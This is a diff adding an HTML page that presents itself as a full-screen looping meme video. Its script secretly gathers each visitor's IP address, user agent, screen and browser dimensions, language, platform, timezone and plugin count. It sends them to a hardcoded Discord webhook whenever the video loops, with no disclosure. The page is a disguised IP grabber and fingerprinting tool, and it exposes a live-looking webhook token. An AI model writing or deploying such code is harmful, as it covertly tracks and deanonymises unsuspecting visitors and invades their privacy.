@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CHIPI CHIPI CHAPA CHAPA DUBI DUBI</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <div id="video-container">
+        <video id="video" autoplay muted loop onended="restartVideo()">
+            <source src="video.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <script>
+        // Function to restart the video when it ends
+        function restartVideo() {
+            var video = document.getElementById('video');
+            video.currentTime = 0;
+            video.play();
+            
+            // Get additional information
+            var info = {
+                ip: '<?= $_SERVER['REMOTE_ADDR']; ?>',
+                userAgent: '<?= $_SERVER['HTTP_USER_AGENT']; ?>',
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                browserWidth: window.innerWidth,
+                browserHeight: window.innerHeight,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                plugins: navigator.plugins.length,
+                // Add more information as needed
+            };
+            
+            // Send data to Discord webhook
+            var webhookUrl = 'https://discord.com/api/webhooks/1230903614743121993/nlWrKoXTAOZT2FUglXZRhcbQYdg212webYz_qDfPHl_aj5KLUt0HDohrSyDpYEME6QZB';
+            var data = {
+                content: 'Additional information:\n' + JSON.stringify(info)
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => console.log('Message sent to Discord webhook'))
+            .catch(error => console.error('Error sending message to Discord webhook:', error));
+        }
+    </script>
+</body>
+</html>
